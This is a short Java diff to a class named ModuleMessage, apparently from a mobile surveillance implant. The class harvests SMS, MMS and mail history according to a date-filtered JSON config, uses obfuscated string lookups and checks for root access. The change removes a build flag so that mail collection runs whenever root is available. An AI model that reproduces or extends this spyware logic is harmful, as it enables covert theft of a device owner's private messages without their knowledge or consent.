@@ -118,11 +118,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		// {"mms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-28 09:40:05"}},"sms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-01 00:00:00"}},"mail":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2011-02-01 00:00:00"}},"module":"messages"}
 		try {
 
-			if(Cfg.ENABLE_MAIL_MODULE){
-				mailEnabled = Status.self().haveRoot() && readJson(ID_MAIL, M.e("mail"), conf, config);
-			}else{
-				mailEnabled = false;
-			}
+	
+			mailEnabled = Status.self().haveRoot() && readJson(ID_MAIL, M.e("mail"), conf, config);
 			smsEnabled = readJson(ID_SMS, M.e("sms"), conf, config);
 			mmsEnabled = readJson(ID_MMS, M.e("mms"), conf, config);
 
